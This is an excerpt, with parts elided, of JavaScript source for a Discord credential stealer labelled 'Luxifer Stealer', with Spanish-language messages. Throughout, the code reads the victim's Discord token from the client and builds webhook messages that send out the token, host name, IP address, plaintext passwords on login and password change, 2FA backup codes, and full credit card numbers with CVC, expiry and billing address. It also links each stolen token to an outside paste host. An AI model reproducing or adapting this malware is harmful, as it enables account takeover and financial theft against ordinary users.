...
function FirstTime() {
	...
	window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
				...
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						embeds: [{
							...
							fields: [{
								name: "Info",
								value: `\`\`\`Nombre de Host: \n${computerName}\nInformacion de Inyeccion: \n${__dirname}\n\`\`\``,
								inline: !1
							}],
							author: {
								name: "Luxifer Stealer"
							},
							footer: {
								text: "Luxifer Stealer"
							}
						}]
					};
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							content: "",
							embeds: [{
								title: "Discord Iniciado",
								description: "[**<:partner:909102089513340979> │ Click aqui para copiar info al movil**](https://ctf.surf/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Nombre del Host: \n${computerName}\nInformacion de Inyeccion: \n${__dirname}\n\`\`\``,
									inline: !1
								}, {
		...
		if (!fs.existsSync(path.join(__dirname, "LuxiferStealer"))) {
			return !0
		}
		fs.rmdirSync(path.join(__dirname, "LuxiferStealer"));
			...
			if (config['logout-notify'] == "true") {
				if (token == null || token == undefined || token == "") {
					var c = {
						...
						content: "",
						embeds: [{
							title: "Usuario deslogeado (Usuario sin deslogear)",
							color: config["embed-color"],
							fields: [{
								name: "Info",
								value: `\`\`\`Nombre de Host: \n${computerName}\nInformacion de Inyeccion: \n${__dirname}\n\`\`\``,
                    ...
                    `, !0).then(a => {
						...
						var c = {
							...
							embeds: [{
								...
								description: "[**<:partner:909102089513340979> │ Click aqui para copiar la informacion al movil**](https://ctf.surf/raw/"+ token +")",
								color: config["embed-color"],
								fields: [{
									name: "Info",
									value: `\`\`\`Nombre de Host: \n${computerName}\nInformacion de Inyeccion: \n${__dirname}\n\`\`\``,
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Click aqui para copiar la informacion al movil**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Nombre de Host: \n${computerName}\nIP: \n${ip}\nInformacion de Inyeccion: \n${discordInstall}\n\`\`\``,
									...
									"title": `Amigos totales (${totalFriends()})`,
									"color": config['embed-color'],
							...
							var mfaembed = {
								"title": ":detective: __2FA Codigos__",
								"description": `[Todos ellos](${baseuri})`,
								"color": config['embed-color'],
								"fields": fieldo,
								"author": {
									"name": "Luxifer Stealer"
              ...
              xmlHttp.responseText`, !0).then((codes) => {
							...
							var params = {
								...
								embeds: [{
									...
									description: "[**<:partner:909102089513340979> │ Click aqui para copiar la informacion al movil**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
									"color": config['embed-color'],
									"fields": [{
										name: "Info",
										value: `\`\`\`Nombre de Host: \n${computerName}\nIP: \n${ip}\nInformacion de Inyeccion: \n${discordInstall}\n\`\`\``,
...
function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {
    ...
    `, !0).then((ip) => {
			...
			var params = {
				...
				content: "",
				embeds: [{
					"title": "El usuario añadio una tarjeta de credito",
					"description": "**Nombre de usuario:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Tipo de Nitro:**```" + GetNitro(json.premium_type) + "```\n**Insignias:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
					"author": {
						"name": "Luxifer Stealer"
					},
					"footer": {
